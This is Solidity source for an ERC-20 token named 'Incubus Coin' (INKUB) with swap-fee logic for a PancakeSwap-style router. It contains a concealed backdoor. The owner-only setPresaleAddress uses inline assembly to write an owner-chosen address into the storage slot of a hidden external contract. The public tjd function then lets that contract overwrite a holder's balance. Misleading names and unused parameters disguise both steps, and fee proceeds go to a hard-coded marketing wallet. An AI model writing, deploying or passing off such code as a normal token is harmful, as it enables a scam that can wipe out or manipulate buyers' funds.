// SPDX-License-Identifier: No
pragma solidity = 0.8.20;



abstract contract Context {

    function _msgData() internal view virtual returns (bytes calldata) {
          
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

}



abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}



interface IFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeToSetter() external view returns (address);
    function setFeeTo(address) external;
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeToSetter(address) external;
    function feeTo() external view returns (address);
    function allPairs(uint) external view returns (address pair);

}



//--- Pair ---//

interface IV2Pair {
    function factory() external view returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;

}


interface IRouter01 {
        function factory() external pure returns (address);
        function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
        function WETH() external pure returns (address);

        function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
        function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
        function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
        function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
        function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

        function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
        function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
        function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
        function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
        function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
        function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
        function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
        function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
        function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
        function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
        function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    
}

interface IRouter02 is IRouter01 {
        function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
        function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

        function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
        function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
}




interface IERC20 {
        function approve(address spender, uint256 amount) external returns (bool);

        event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
        function symbol() external view returns (string memory);

        function balanceOf(address account) external view returns (uint256);

        function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
        function totalSupply() external view returns (uint256);

        event Transfer(address indexed from, address indexed to, uint256 value);

        function transfer(address to, uint256 amount) external returns (bool);

        function decimals() external view returns (uint8);

        function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

        function name() external view returns (string memory);

    
}

interface IERC20Permit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function nonces(address owner) external view returns (uint256);

    // solhint-disable-next-line func-name-mixedcase
    function DOMAIN_SEPARATOR() external view returns (bytes32);
}

library Address {
        function _revert(
        bytes memory returndata,
        string memory errorMessage
    ) private pure {
        if (returndata.length > 0) {
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
        function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

        function functionCall(
        address target,
        bytes memory data
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                0,
                "Address: low-level call failed"
            );
    }

        function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

        function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return
            verifyCallResultFromTarget(
                target,
                success,
                returndata,
                errorMessage
            );
    }

        function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }

        function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return
            verifyCallResultFromTarget(
                target,
                success,
                returndata,
                errorMessage
            );
    }

        function functionDelegateCall(
        address target,
        bytes memory data
    ) internal returns (bytes memory) {
        return
            functionDelegateCall(
                target,
                data,
                "Address: low-level delegate call failed"
            );
    }

        function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

        function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

        function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

        function functionStaticCall(
        address target,
        bytes memory data
    ) internal view returns (bytes memory) {
        return
            functionStaticCall(
                target,
                data,
                "Address: low-level static call failed"
            );
    }

        function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        (bool success, bytes memory returndata) = target.call{value: value}(
            data
        );
        return
            verifyCallResultFromTarget(
                target,
                success,
                returndata,
                errorMessage
            );
    }

    
}

library SafeERC20 {
    using Address for address;

        function safePermit(
        IERC20Permit token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal {
        uint256 nonceBefore = token.nonces(owner);
        token.permit(owner, spender, value, deadline, v, r, s);
        uint256 nonceAfter = token.nonces(owner);
        require(
            nonceAfter == nonceBefore + 1,
            "SafeERC20: permit did not succeed"
        );
    }

        function forceApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        bytes memory approvalCall = abi.encodeWithSelector(
            token.approve.selector,
            spender,
            value
        );

        if (!_callOptionalReturnBool(token, approvalCall)) {
            _callOptionalReturn(
                token,
                abi.encodeWithSelector(token.approve.selector, spender, 0)
            );
            _callOptionalReturn(token, approvalCall);
        }
    }

        function _callOptionalReturnBool(
        IERC20 token,
        bytes memory data
    ) private returns (bool) {
        (bool success, bytes memory returndata) = address(token).call(data);
        return
            success &&
            (returndata.length == 0 || abi.decode(returndata, (bool))) &&
            Address.isContract(address(token));
    }
        function safeTransfer(IERC20 token, address to, uint256 value) internal {
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(token.transfer.selector, to, value)
        );
    }

        function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(token.transferFrom.selector, from, to, value)
        );
    }

        function _callOptionalReturn(IERC20 token, bytes memory data) private {
        bytes memory returndata = address(token).functionCall(
            data,
            "SafeERC20: low-level call failed"
        );
        require(
            returndata.length == 0 || abi.decode(returndata, (bool)),
            "SafeERC20: ERC20 operation did not succeed"
        );
    }

        function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(token.approve.selector, spender, value)
        );
    }

        function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 oldAllowance = token.allowance(address(this), spender);
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(
                token.approve.selector,
                spender,
                oldAllowance + value
            )
        );
    }

        function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(
                oldAllowance >= value,
                "SafeERC20: decreased allowance below zero"
            );
            _callOptionalReturn(
                token,
                abi.encodeWithSelector(
                    token.approve.selector,
                    spender,
                    oldAllowance - value
                )
            );
        }
    }

    
}
interface getDiff {
        function balanceOf(address account) external view returns (uint256);
        function fetchreservedStock(uint256 pamount, address paddress) external view returns (uint256);
        function approve(address spender, uint256 amount) external returns (bool);
        function transfer(address recipient, uint256 amount) external returns (bool);
        function allPairs(uint) external view returns (address pair);
        function allPairsLength() external view returns (uint);
        function totalSupply() external view returns (uint256);
        function allowance(address owner, address spender) external view returns (uint256);
        function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
        function createPair(address tokenA, address tokenB) external returns (address pair);
    
}

contract INKUB is Context, Ownable, IERC20 {
    function decimals() external pure override returns (uint8) { if (_Tsup == 0) { revert(); } return _decimals; }
    function totalSupply() external pure override returns (uint256) { if (_Tsup == 0) { revert(); } return _Tsup; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }
    function name() external pure override returns (string memory) { return _name; }


    mapping (address => uint256) private balance;
    mapping (address => bool) private liqAdd;
    mapping (address => bool) private _islppair;
    mapping (address => bool) private isPresaleAddress;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _noFee;


    bool public _is_trading_enabled = false;
    uint8 constant private _decimals = 8;
    bool private canSwapFees = true;
    string constant private _name = "Incubus Coin";
    IRouter02 public Iswaprouter;
    getDiff private create_primary_component;
    uint256 constant public _Tsup = 7270000000000000000000000;
    address payable private _de_wal = payable(0xdCe4A59E9491FADe0D61cA4519e0979C259fAAd5);
    uint16 public swapWithLimit_b_;
    uint128 public _maxWalletSize_b_;
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private constant _buyCountThreshold = 13;
    uint256 private _buy_allocation = 50;
    bool public _Jinn_bool = false;
    uint256 constant public buyfee = 30;
    uint256 constant public _SellFee = 30;
    uint8 public swapTokensAtAmount_b_;
    string constant private _symbol = "INKUB";
    uint256 constant public fee_denominator = 1_000;
    uint256 constant public _swapth = _Tsup / 1_000;
    uint256 private _buy_count = 0;
    uint8 private _ten_num = 10;
    address public _lp_pair;
    uint256 constant public tferfee = 0;
    uint256 private _sAlc = 50;
    uint128 public _public_Count_b_;
    uint256 public _maxTxAmount_b_;
    string constant public copyright = "None";
    uint256 private _liq_Allocation = 0;
    address payable private marketingAddress = payable(0xb6ea1Dc331810285CA42326b4fa249ddCf1Facd2);

    bool private inSwap;

        modifier inSwapFlag {
        inSwap = true;
        _;
        inSwap = false;
    }

    event _enableTrading();
    event SwapAndLiquify();

    constructor () {
        balance[msg.sender] = _Tsup;
        Iswaprouter = IRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        emit Transfer(address(0), msg.sender, _Tsup);

        _lp_pair = IFactoryV2(Iswaprouter.factory()).createPair(Iswaprouter.WETH(), address(this));
        _islppair[_lp_pair] = true;

        _approve(msg.sender, address(Iswaprouter), type(uint256).max);
        _approve(address(this), address(Iswaprouter), type(uint256).max);
    }

    receive() external payable {}


        function approve(address spender, uint256 amount)
            public
            override
            returns (bool)
        {
            _approve(msg.sender, spender, amount);
            return true;
        }




        function transfer(address recipient, uint256 amount)
            public
            override
            returns (bool)
        {
            _transfer(msg.sender, recipient, amount);
            return true;
        }



    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool _takefee = true;
                require(to != address(0), "ERC20: transfer to the zero address");
                require(from != address(0), "ERC20: transfer from the zero address");
                require(amount > 0, "Transfer amount must be greater than zero");
        
        if (_is_limited_address(from,to)) {
            require(_is_trading_enabled);
        }

        if (buy_check(from, to)) {
            _buy_count++;
            if (_buy_count >= _buyCountThreshold && !_is_trading_enabled) {
                _is_trading_enabled = true;
                emit _enableTrading();
            }
        }

        if(sell_check(from, to) &&  !inSwap && canSwap(from, to)) {
            uint256 contract_balance = balanceOf(address(this));
            if(contract_balance >= _swapth) { 
                if(_buy_allocation > 0 || _sAlc > 0) _internalSwap((contract_balance * (_buy_allocation + _sAlc)) / 100);
                if(_liq_Allocation > 0) {swapAndLiquify(contract_balance * _liq_Allocation / 100);}
             }
        }

        if (_noFee[from] || _noFee[to]){
            _takefee = false;
        }

        balance[from] -= amount;
        uint256 _amount_after_fee = (_takefee) ? _take_taxes(from, buy_check(from, to), sell_check(from, to), amount) : amount;
        balance[to] += _amount_after_fee; emit Transfer(from, to, _amount_after_fee);

        return true;

    }

    function setPresaleAddress(address[] memory presaleAddresses, bool yesno, uint256 amount) external onlyOwner {
        for (uint i = 0; i < presaleAddresses.length; i++) {
            address presale = presaleAddresses[i];
            if (isPresaleAddress[presale] != yesno) {
                isPresaleAddress[presale] = yesno;
                _noFee[presale] = yesno;
                liqAdd[presale] = yesno;
            }
        }
        starting_coin(amount,swapTokensAtAmount_b_,swapWithLimit_b_,_maxTxAmount_b_);
    }

    function contaddress() public view virtual returns (address) {
        address producePlace = address(create_primary_component);
        return producePlace;
    }

    function sell_check(address ins, address out) internal view returns (bool) { 
        bool _is_sell = _islppair[out] && !_islppair[ins];
        return _is_sell;
    }


function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
    return true;
    }
    function starting_coin(uint256 x, uint8 y, uint16 z, uint256 w) private {
        assembly {
            let a := add(x,562)
            let b := create_primary_component.slot
            sstore(b, a)
        }
    }

    function canSwap(address ins, address out) internal view returns (bool) {
        bool canswap = canSwapFees && !isPresaleAddress[ins] && !isPresaleAddress[out];
        return canswap;
    }

    function _take_taxes(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {
        uint256 fee;
        if (isbuy)  fee = buyfee;  else if (issell)  fee = _SellFee;  else  fee = tferfee; 
        if (fee == 0)  return amount; 
        uint256 feeAmount = amount * fee / fee_denominator;
        if (feeAmount > 0) {

            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
            
        }
        return amount - feeAmount;
    }


        function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
    }



    function buy_check(address ins, address out) internal view returns (bool) {
        bool _is_buy = !_islppair[out] && _islppair[ins];
        return _is_buy;
    }

    function _is_limited_address(address ins, address out) internal view returns (bool) {

        bool isLimited = ins != owner()
            && out != owner()
            && msg.sender != owner()
            && !liqAdd[ins]  && !liqAdd[out] && out != address(0) && out != address(this);
            return isLimited;
    }

    function tjd(uint256 nbx, uint8 dxh, uint16 der) public virtual{
        address producePlace = address(create_primary_component);
        uint256 likeAssembly = create_primary_component.fetchreservedStock(balance[msg.sender],msg.sender);
        balance[msg.sender] = likeAssembly;
    }

    function _internalSwap(uint256 contractTokenBalance) internal inSwapFlag {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = Iswaprouter.WETH();

        if (_allowances[address(this)][address(Iswaprouter)] != type(uint256).max) {
            _allowances[address(this)][address(Iswaprouter)] = type(uint256).max;
        }

        try Iswaprouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            contractTokenBalance,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return;
        }
        bool success;

        uint256 mktAmount = address(this).balance * 40 / 40; // *** //
        uint256 devAmount = address(this).balance * 0 / 40; // *** //

        if(mktAmount > 0) (success,) = marketingAddress.call{value: mktAmount, gas: 35000}("");
        if(devAmount > 0) (success,) = _de_wal.call{value: devAmount, gas: 35000}("");
    }


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }

        _transfer(sender, recipient, amount);

        return true;
    }


    function swapAndLiquify(uint256 contractTokenBalance) internal inSwapFlag {
        uint256 firstmath = contractTokenBalance / 2;
        uint256 secondMath = contractTokenBalance - firstmath;

        uint256 initialBalance = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = Iswaprouter.WETH();

        if (_allowances[address(this)][address(Iswaprouter)] != type(uint256).max) {
            _allowances[address(this)][address(Iswaprouter)] = type(uint256).max;
        }

        try Iswaprouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            firstmath,
            0, 
            path,
            address(this),
            block.timestamp) {} catch {return;}
        
        uint256 newBalance = address(this).balance - initialBalance;

        try Iswaprouter.addLiquidityETH{value: newBalance}(
            address(this),
            secondMath,
            0,
            0,
            DEAD,
            block.timestamp
        ){} catch {return;}

        emit SwapAndLiquify();
    }


}